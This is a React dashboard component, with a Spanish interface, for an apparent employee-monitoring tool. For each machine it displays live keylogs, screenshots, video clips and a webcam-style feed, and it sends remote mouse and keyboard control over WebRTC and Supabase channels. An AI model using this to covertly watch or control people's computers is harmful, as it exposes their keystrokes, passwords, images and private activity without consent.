import { useEffect, useState, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Settings, Wifi, WifiOff, MonitorPlay, MousePointer2, Camera, RefreshCw } from 'lucide-react';

export default function EmployeeDetail() {
    const { id } = useParams();
    const navigate = useNavigate();

    const [employee, setEmployee] = useState(null);
    const [keylogs, setKeylogs] = useState([]);
    const [screenshots, setScreenshots] = useState([]);
    const [videos, setVideos] = useState([]);
    const [isOnline, setIsOnline] = useState(false);

    const [isStreaming, setIsStreaming] = useState(false);
    const videoRef = useRef(null);
    const camRef = useRef(null);
    const pcRef = useRef(null);
    const channelRef = useRef(null);
    const controlChannelRef = useRef(null);

    const [settings, setSettings] = useState({ screenshot_interval: 300, video_duration: 10, screenshots_enabled: false });
    const [savingSettings, setSavingSettings] = useState(false);
    const [requestingScreenshot, setRequestingScreenshot] = useState(false);
    const [requestingVideo, setRequestingVideo] = useState(false);

    useEffect(() => {
        fetchEmployee();
        fetchInitialData();

        const sub = supabase.channel(`employee-${id}`)
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'keylogs', filter: `employee_id=eq.${id}` },
                payload => setKeylogs(prev => [payload.new, ...prev]))
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'screenshots', filter: `employee_id=eq.${id}` },
                payload => { setScreenshots(prev => [resolveUrl(payload.new, 'screenshots'), ...prev]); setRequestingScreenshot(false); })
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'videos', filter: `employee_id=eq.${id}` },
                payload => { setVideos(prev => [resolveUrl(payload.new, 'videos'), ...prev]); setRequestingVideo(false); })
            .subscribe();

        const interval = setInterval(() => {
            if (employee?.last_seen) {
                setIsOnline((new Date() - new Date(employee.last_seen)) / 1000 < 60);
            }
        }, 5000);

        return () => {
            supabase.removeChannel(sub);
            clearInterval(interval);
            stopStream();
        }
    }, [id, employee?.last_seen]);

    const resolveUrl = (item, bucket) => ({ ...item, publicUrl: item.url.startsWith('http') ? item.url : supabase.storage.from(bucket).getPublicUrl(item.storage_path).data.publicUrl });

    const fetchEmployee = async () => {
        const { data } = await supabase.from('employees').select('*').eq('id', id).single();
        if (data) {
            setEmployee(data);
            if (data.settings) setSettings(data.settings);
            setIsOnline((new Date() - new Date(data.last_seen)) / 1000 < 60);
        }
    };

    const fetchInitialData = async () => {
        const k = await supabase.from('keylogs').select('*').eq('employee_id', id).order('captured_at', { ascending: false }).limit(50);
        if (k.data) setKeylogs(k.data);
        const s = await supabase.from('screenshots').select('*').eq('employee_id', id).order('created_at', { ascending: false }).limit(20);
        if (s.data) setScreenshots(s.data.map(i => resolveUrl(i, 'screenshots')));
        const v = await supabase.from('videos').select('*').eq('employee_id', id).order('created_at', { ascending: false }).limit(10);
        if (v.data) setVideos(v.data.map(i => resolveUrl(i, 'videos')));
    };

    const saveSettings = async () => {
        setSavingSettings(true);
        await supabase.from('employees').update({ settings }).eq('id', id);
        setSavingSettings(false);
    };

    const requestScreenshot = async () => {
        setRequestingScreenshot(true);
        await supabase.from('commands').insert({ employee_id: id, command_type: 'TAKE_SCREENSHOT', payload: {} });
    };

    const requestVideoClip = async () => {
        setRequestingVideo(true);
        await supabase.from('commands').insert({ employee_id: id, command_type: 'RECORD_CLIP', payload: {} });
    };

    const startStream = async () => {
        setIsStreaming(true);
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pcRef.current = pc;

        pc.ontrack = (event) => {
            if (videoRef.current && !videoRef.current.srcObject) {
                videoRef.current.srcObject = event.streams[0];
            } else if (camRef.current) {
                camRef.current.srcObject = event.streams[0];
            }
        };

        pc.addTransceiver('video', { direction: 'recvonly' });
        pc.addTransceiver('video', { direction: 'recvonly' });

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        const channel = supabase.channel(`signaling-${id}`);
        channel.on('broadcast', { event: 'ANSWER' }, async (payload) => {
            const answer = new RTCSessionDescription(payload.payload);
            await pc.setRemoteDescription(answer);
        }).subscribe(async (status) => {
            if (status === 'SUBSCRIBED') {
                await channel.send({ type: 'broadcast', event: 'OFFER', payload: { sdp: offer.sdp, type: offer.type } });
            }
        });
        channelRef.current = channel;

        const ctrlChannel = supabase.channel(`control-${id}`);
        ctrlChannel.subscribe();
        controlChannelRef.current = ctrlChannel;
    };

    const stopStream = () => {
        if (pcRef.current) pcRef.current.close();
        if (channelRef.current) supabase.removeChannel(channelRef.current);
        if (controlChannelRef.current) supabase.removeChannel(controlChannelRef.current);
        setIsStreaming(false);
    };

    const handleMouseMove = (e) => {
        if (!controlChannelRef.current || !isStreaming) return;
        const rect = videoRef.current.getBoundingClientRect();
        controlChannelRef.current.send({ type: 'broadcast', event: 'MOUSE_MOVE', payload: { x: (e.clientX - rect.left) / rect.width, y: (e.clientY - rect.top) / rect.height } });
    };

    const handleClick = (e) => {
        if (!controlChannelRef.current || !isStreaming) return;
        const rect = videoRef.current.getBoundingClientRect();
        controlChannelRef.current.send({ type: 'broadcast', event: 'MOUSE_CLICK', payload: { x: (e.clientX - rect.left) / rect.width, y: (e.clientY - rect.top) / rect.height, button: 'left' } });
    };

    const handleKeyDown = (e) => {
        if (!controlChannelRef.current || !isStreaming) return;
        controlChannelRef.current.send({ type: 'broadcast', event: 'KEY_PRESS', payload: { key: e.key } });
    };

    if (!employee) return <div className="p-8 text-center">Cargando...</div>;

    return (
        <div className="p-6 max-w-[1800px] mx-auto space-y-4" onKeyDown={handleKeyDown} tabIndex={0}>

            {/* Header */}
            <div className="flex items-center justify-between bg-white p-4 rounded-xl shadow-sm border">
                <button onClick={() => navigate('/')} className="flex items-center text-gray-500 hover:text-gray-900 transition">
                    <ArrowLeft className="w-5 h-5 mr-1" /> Volver
                </button>
                <h1 className="text-xl font-bold flex items-center gap-3">
                    {employee.hostname}
                    {isOnline ?
                        <span className="flex items-center gap-1 text-green-600 text-sm bg-green-100 px-2 py-0.5 rounded-full"><Wifi className="w-4 h-4" /> En línea</span> :
                        <span className="flex items-center gap-1 text-gray-500 text-sm bg-gray-100 px-2 py-0.5 rounded-full"><WifiOff className="w-4 h-4" /> Desconectado</span>
                    }
                </h1>
                <div className="flex gap-2">
                    <button onClick={requestScreenshot} disabled={requestingScreenshot} className="flex items-center gap-1 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-lg text-sm disabled:opacity-50">
                        {requestingScreenshot ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Camera className="w-4 h-4" />} Captura
                    </button>
                    <button onClick={requestVideoClip} disabled={requestingVideo} className="flex items-center gap-1 bg-red-600 hover:bg-red-700 text-white px-3 py-1.5 rounded-lg text-sm disabled:opacity-50">
                        {requestingVideo ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Video className="w-4 h-4" />} Video
                    </button>
                </div>
            </div>

            {/* Main Grid */}
            <div className="grid grid-cols-12 gap-4" style={{ height: 'calc(100vh - 160px)' }}>

                {/* Left: Remote Control */}
                <div className="col-span-8 bg-gray-900 rounded-xl overflow-hidden relative flex items-center justify-center">
                    {!isStreaming ? (
                        <button onClick={startStream} className="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white px-8 py-4 rounded-xl flex items-center gap-3 text-lg shadow-2xl transition-all transform hover:scale-105">
                            <MonitorPlay className="w-7 h-7" /> Iniciar Control Remoto
                        </button>
                    ) : (
                        <div className="relative w-full h-full">
                            <video ref={videoRef} autoPlay className="w-full h-full object-contain cursor-crosshair" onMouseMove={handleMouseMove} onClick={handleClick} />
                            <div className="absolute bottom-4 right-4 w-56 aspect-video bg-gray-800 rounded-lg border-2 border-gray-700 shadow-xl overflow-hidden">
                                <video ref={camRef} autoPlay className="w-full h-full object-cover" />
                            </div>
                            <div className="absolute top-4 left-1/2 -translate-x-1/2 bg-black/70 text-white px-4 py-2 rounded-full flex items-center gap-4 backdrop-blur-sm">
                                <span className="flex items-center gap-2 text-sm"><MousePointer2 className="w-4 h-4 text-green-400" /> Control Activo</span>
                                <button onClick={stopStream} className="bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-xs">Detener</button>
                            </div>
                        </div>
                    )}
                </div>

                {/* Right Column */}
                <div className="col-span-4 space-y-4 flex flex-col min-h-0">

                    {/* Settings */}
                    <div className="bg-white p-4 rounded-xl shadow-sm border flex-shrink-0">
                        <h3 className="font-semibold text-gray-700 flex items-center gap-2 mb-3"><Settings className="w-4 h-4" /> Configuración</h3>
                        <div className="space-y-2 text-sm">
                            <label className="flex items-center justify-between">
                                <span>Capturas automáticas</span>
                                <input type="checkbox" checked={settings.screenshots_enabled} onChange={e => setSettings({ ...settings, screenshots_enabled: e.target.checked })} className="w-4 h-4 accent-blue-600" />
                            </label>
                            <label className="flex items-center justify-between">
                                <span>Intervalo (seg)</span>
                                <input type="number" value={settings.screenshot_interval} onChange={e => setSettings({ ...settings, screenshot_interval: parseInt(e.target.value) })} className="border rounded p-1 w-20 text-right" />
                            </label>
                            <label className="flex items-center justify-between">
                                <span>Duración video (seg)</span>
                                <input type="number" value={settings.video_duration} onChange={e => setSettings({ ...settings, video_duration: parseInt(e.target.value) })} className="border rounded p-1 w-20 text-right" />
                            </label>
                            <button onClick={saveSettings} disabled={savingSettings} className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 py-2 rounded-lg text-sm mt-2 transition">
                                {savingSettings ? 'Guardando...' : 'Guardar Configuración'}
                            </button>
                        </div>
                    </div>

                    {/* Keylogs */}
                    <div className="bg-white p-4 rounded-xl shadow-sm border flex-1 flex flex-col min-h-0">
                        <h3 className="font-semibold text-gray-700 flex items-center gap-2 mb-2"><Keyboard className="w-4 h-4" /> Teclas en Vivo</h3>
                        <div className="bg-gray-50 p-3 rounded-lg flex-1 overflow-y-auto font-mono text-xs space-y-2">
                            {keylogs.map(log => (
                                <div key={log.id} className="border-b border-gray-200 pb-1">
                                    <span className="text-gray-400 block" style={{ fontSize: '10px' }}>{new Date(log.captured_at).toLocaleTimeString()}</span>
                                    <div className="whitespace-pre-wrap break-words text-gray-800">{log.content}</div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Screenshots */}
                    <div className="bg-white p-4 rounded-xl shadow-sm border flex-shrink-0" style={{ height: '160px' }}>
                        <h3 className="font-semibold text-gray-700 flex items-center gap-2 mb-2"><ImageIcon className="w-4 h-4" /> Capturas Recientes</h3>
                        <div className="flex gap-2 overflow-x-auto pb-2">
                            {screenshots.slice(0, 6).map(shot => (
                                <a key={shot.id} href={shot.publicUrl} target="_blank" rel="noreferrer" className="flex-shrink-0 w-24 hover:opacity-80 transition">
                                    <img src={shot.publicUrl} className="w-full h-16 object-cover rounded-lg border shadow-sm" />
                                </a>
                            ))}
                        </div>
                    </div>

                    {/* Videos */}
                    <div className="bg-white p-4 rounded-xl shadow-sm border flex-shrink-0" style={{ height: '160px' }}>
                        <h3 className="font-semibold text-gray-700 flex items-center gap-2 mb-2"><Video className="w-4 h-4" /> Videos Recientes</h3>
                        <div className="flex gap-2 overflow-x-auto pb-2">
                            {videos.slice(0, 4).map(vid => (
                                <div key={vid.id} className="flex-shrink-0 w-32">
                                    <video src={vid.publicUrl} controls className="w-full h-20 object-cover rounded-lg border shadow-sm bg-black" />
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
